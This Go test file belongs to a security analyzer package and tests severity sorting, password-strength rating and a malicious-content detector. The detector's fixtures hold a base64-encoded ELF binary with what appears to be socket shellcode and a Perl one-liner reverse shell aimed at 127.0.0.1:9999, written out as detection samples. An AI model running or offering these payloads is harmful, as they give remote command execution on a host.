package analyzer

import (
	"reflect"
	"testing"
)

func TestSortSeverity(t *testing.T) {
	type args struct {
		threats []*threat
	}
	tests := []struct {
		name string
		args args
	}{
		{
			name: "sort_test_1",
			args: args{threats: []*threat{{Severity: "high"}, {Severity: "low"}, {Severity: "critical"}}},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			sortSeverity(tt.args.threats)
		})
	}
}

func TestWeakPassword(t *testing.T) {
	type args struct {
		p string
	}

	tests := []struct {
		name    string
		args    args
		want    string
		wantErr bool
	}{
		{
			name: "weakPassword",
			args: args{p: "root"},
			want: "Weak",
		},
		{
			name: "weakPassword",
			args: args{p: "Password123"},
			want: "Weak",
		},
		{
			name: "strongPassword",
			args: args{p: "dDjwC3m^BFXz6B#a"},
			want: "Strong",
		},
		{
			name: "strongConfusionPassword",
			args: args{p: "ior7LLvMsAujin3Y"},
			want: "Strong",
		},
		{
			name: "mediumPassword",
			args: args{p: "plDAYh"},
			want: "Medium",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := checkWeakPassword(tt.args.p)
			if !reflect.DeepEqual(got, tt.want) {
				t.Errorf("checkWeakPassword() got = %v, want %v", got, tt.want)
			}
		})
	}

}

func TestMalware(t *testing.T) {
	type args struct {
		command string
	}

	tests := []struct {
		name    string
		args    args
		want    MalReporter
		wantErr bool
	}{
		{
			name: "ELF base64",
			args: args{command: "XHg3Rlx4NDVceDRDXHg0Nlx4MDFceDAxXHgwMVx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDJceDAwXHgwM1x4MDBceDAxXHgwMFx4MDBceDAwXHg1NFx4ODBceDA0XHgwOFx4MzRceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MzRceDAwXHgyMFx4MDBceDAxXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDFceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4ODBceDA0XHgwOFx4MDBceDgwXHgwNFx4MDhceENGXHgwMFx4MDBceDAwXHg0QVx4MDFceDAwXHgwMFx4MDdceDAwXHgwMFx4MDBceDAwXHgxMFx4MDBceDAwXHg2QVx4MEFceDVFXHgzMVx4REJceEY3XHhFM1x4NTNceDQzXHg1M1x4NkFceDAyXHhCMFx4NjZceDg5XHhFMVx4Q0RceDgwXHg5N1x4NUJceDY4XHhDMFx4QThceDEzXHhGM1x4NjhceDAyXHgwMFx4MTFceDVDXHg4OVx4RTFceDZBXHg2Nlx4NThceDUwXHg1MVx4NTdceDg5XHhFMVx4NDNceENEXHg4MFx4ODVceEMwXHg3OVx4MTlceDRFXHg3NFx4M0RceDY4XHhBMlx4MDBceDAwXHgwMFx4NThceDZBXHgwMFx4NkFceDA1XHg4OVx4RTNceDMxXHhDOVx4Q0RceDgwXHg4NVx4QzBceDc5XHhCRFx4RUJceDI3XHhCMlx4MDdceEI5XHgwMFx4MTBceDAwXHgwMFx4ODlceEUzXHhDMVx4RUJceDBDXHhDMVx4RTNceDBDXHhCMFx4N0RceENEXHg4MFx4ODVceEMwXHg3OFx4MTBceDVCXHg4OVx4RTFceDk5XHhCMlx4NkFceEIwXHgwM1x4Q0RceDgwXHg4NVx4QzBceDc4XHgwMlx4RkZceEUxXHhCOFx4MDFceDAwXHgwMFx4MDBceEJCXH=="},
			want: MalReporter{
				Types: Executable,
				Score: 0.9,
				Plain: "ELF LSB executable binary",
			},
		},
		{
			name: "Reverse shell",
			args: args{command: "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"127.0.0.1:9999\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"},
			want: MalReporter{
				Types: Confusion,
				Score: 0.99,
				Plain: "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socke",
			},
		},
		{
			name: "Normal environment",
			args: args{command: "SPq$b6^vuY8Bo2dM"},
			want: MalReporter{
				Types: Unknown,
				Score: 0.0,
				Plain: "SPq$b6^vuY8Bo2dM",
			},
		},
		{
			name: "Normal $PATH environment",
			args: args{command: "/usr/local/share/luajit-2.1.0-beta3/?.lua;/usr/local/share/lua/5.1/?.lua;/usr/local/lib/lua/?.lua;;"},
			want: MalReporter{
				Types: Unknown,
				Score: 0.0,
				Plain: "",
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := maliciousContentCheck(tt.args.command)
			if !reflect.DeepEqual(got, tt.want) {
				t.Errorf("maliciousContentCheck() got = %v, want %v", got, tt.want)
			}
		})
	}
}
